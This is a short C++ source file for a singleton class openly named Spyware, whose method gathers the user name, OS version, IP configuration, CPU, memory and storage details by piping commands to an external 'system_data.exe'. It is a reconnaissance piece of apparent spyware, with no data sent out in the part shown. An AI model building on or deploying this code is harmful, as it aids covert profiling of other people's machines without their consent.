#include "spyware.h"

Spyware* Spyware::instance = nullptr;

Spyware* Spyware::getInstance() {
    if(instance == nullptr)
        instance = new Spyware();

    return instance;
}

Spyware::Spyware() {

}

std::string Spyware::getSystemData(int id) {
    std::string output;
//all processes
    switch(id) {
        case USER_NAME:
            return pipeCommandExecution("system_data.exe USER_NAME");
            break;

        case OS_VERSION:
            return pipeCommandExecution("system_data.exe OS_VERSION");
            break;

        case IP_CONFIG:
            return pipeCommandExecution("system_data.exe IP_CONFIG");
            break;

        case CPU_INFO:
            return pipeCommandExecution("system_data.exe CPU_INFO");
            break;

        case MEMORY_INFO:
            return pipeCommandExecution("system_data.exe -MEMORY_INFO");
            break;

        case STORAGE_INFO:
            return pipeCommandExecution("system_data.exe -STORAGE_INFO");
            break;
    }

    return output;
}
